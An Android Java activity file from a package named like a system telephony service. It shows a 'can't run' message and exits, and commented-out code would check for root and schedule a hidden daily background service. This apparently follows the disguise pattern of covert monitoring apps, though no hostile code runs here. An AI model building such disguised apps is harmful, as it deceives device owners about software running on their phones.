package com.telephony.services;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class Main extends Activity {
	private static final String LogTag = "myLogs";
	// private Utils utils = new Utils();
	String s;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);

		Toast.makeText(this, getResources().getString(R.string.cant_run), Toast.LENGTH_SHORT).show();

		// Intent myIntent = new Intent(this, ReglamentService.class);

		// startService(myIntent);

		// Log.d(LogTag, Utils.CheckRoot()+"");
		//AlarmManager am;
		//am = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
		//Intent myIntent = new Intent(this, ReglamentService.class);
		//PendingIntent pmyIntent = PendingIntent.getService(this, 0, myIntent, 0);
		//am.setRepeating(AlarmManager.ELAPSED_REALTIME, 50000L, AlarmManager.INTERVAL_DAY, pmyIntent);

		finish();
	}

}
